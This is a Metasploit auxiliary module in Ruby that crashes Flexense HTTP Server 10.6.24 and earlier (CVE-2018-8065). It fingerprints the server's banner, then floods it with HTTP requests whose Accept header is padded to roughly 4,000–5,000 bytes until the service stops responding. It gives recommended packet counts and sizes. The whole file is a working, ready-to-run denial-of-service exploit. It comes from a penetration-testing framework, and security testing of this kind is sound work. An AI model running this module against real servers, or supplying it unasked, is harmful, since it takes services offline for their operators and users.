##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Flexense HTTP Server Denial Of Service',
      'Description'    => %q{
        This module triggers a Denial of Service vulnerability in the Flexense HTTP server.
        Vulnerability caused by a user mode write access memory violation and can be triggered with
        rapidly sending variety of HTTP requests with long HTTP header values.

        Multiple Flexense applications that are using Flexense HTTP server 10.6.24 and below vesions reportedly vulnerable.
      },
      'Author' 		=> [ 'Ege Balci <ege.balci@invictuseurope.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-8065'],
          [ 'URL', 'https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS' ],
        ],
      'DisclosureDate' => 'Mar 09 2018'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('PacketCount',     [ true, "The number of packets to be sent (Recommended: Above 1725)" , 1725 ]),
        OptString.new('PacketSize',      [ true, "The number of bytes in the Accept header (Recommended: 4088-5090"  , rand(4088..5090) ])
      ])

  end

  def check
    begin
      connect
      sock.put("GET / HTTP/1.0\r\n\r\n")
      res = sock.get
      if res and res.include? 'Flexense HTTP Server v10.6.24'
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    rescue Rex::ConnectionRefused
      print_error("Target refused the connection")
      Exploit::CheckCode::Unknown
    rescue
      print_error("Target did not respond to HTTP request")
      Exploit::CheckCode::Unknown
    end
  end

  def run
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    size = datastore['PacketSize'].to_i
    print_status("Starting with packets of #{size}-byte strings")

    count = 0
    loop do
      payload = ""
      payload << "GET /" + Rex::Text.rand_text_alpha(rand(30)) + " HTTP/1.1\r\n"
      payload << "Host: 127.0.0.1\r\n"
      payload << "Accept: "+('A' * size)+"\r\n"
      payload << "\r\n\r\n"
      begin
        connect
        sock.put(payload)
        disconnect
        count += 1
        break if count==datastore['PacketCount']
      rescue ::Rex::InvalidDestination
        print_error('Invalid destination!  Continuing...')
      rescue ::Rex::ConnectionTimeout
        print_error('Connection timeout!  Continuing...')
      rescue ::Errno::ECONNRESET
        print_error('Connection reset!  Continuing...')
      rescue ::Rex::ConnectionRefused
        print_good("DoS successful after #{count} packets with #{size}-byte headers")
        return true
      end
    end
    print_error("DoS failed after #{count} packets of #{size}-byte strings")
  end
end
